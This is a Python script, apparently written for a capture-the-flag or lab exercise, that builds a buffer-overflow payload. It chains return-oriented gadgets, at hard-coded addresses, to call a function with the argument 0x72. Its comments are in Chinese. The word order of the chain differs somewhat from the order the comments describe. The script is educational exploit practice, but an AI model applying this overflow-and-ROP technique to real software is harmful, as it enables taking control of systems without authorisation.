import struct

# ===================== 从你的反汇编里抄的绝对正确地址（别改）=====================
PADDING = 40                  # 覆盖缓冲区到返回地址的字节数（精准！）
MOV_RAX = 0x4012f1            # mov_rax函数：rax = 传入的rdi参数
MOV_RDI = 0x4012da            # mov_rdi函数：rdi = 传入的rax参数
FUNC1 = 0x401216              # 最终要跳的func1（需要edi=0x72）
RET = 0x40101a                # 纯ret指令（栈对齐用，地址来自_init的ret）

# ===================== 逐段构造Payload =====================
# 1. 40字节填充：把func的缓冲区+RBP全覆盖，到返回地址位
padding = b'A' * PADDING

# 2. ROP链核心：实现“rdi=0x72” + 跳func1
# 2.1 先放ret（栈对齐，避免x86-64的16字节对齐崩溃）
ret = struct.pack('<Q', RET)

# 2.2 调用mov_rax：把参数0x72放到rax里
mov_rax_addr = struct.pack('<Q', MOV_RAX)  # 跳去执行mov_rax
mov_rax_arg = struct.pack('<Q', 0x72)      # 传给mov_rax的参数（0x72）
mov_rax_ret = struct.pack('<Q', MOV_RDI)   # mov_rax执行完后，跳去执行mov_rdi

# 2.3 调用mov_rdi：把rax里的0x72放到rdi里
mov_rdi_ret = struct.pack('<Q', FUNC1)     # mov_rdi执行完后，跳去func1

# 2.4 把ROP链拼起来：ret对齐 → 调mov_rax（传0x72） → 调mov_rdi → 跳func1
rop_chain = ret + mov_rax_addr + mov_rax_ret + mov_rax_arg + mov_rdi_ret

# 3. 补满0x100字节（匹配main里fread的长度，避免Payload被截断）
payload = padding + rop_chain
payload += b'C' * (0x100 - len(payload))

# 4. 写入文件（直接用这个文件运行程序）
with open("final_payload.txt", "wb") as f:
    f.write(payload)

print(f"Payload已生成，长度：{len(payload)} 字节（刚好0x100）")
print(f"核心ROP链：ret → mov_rax → mov_rdi → func1（带参数0x72）")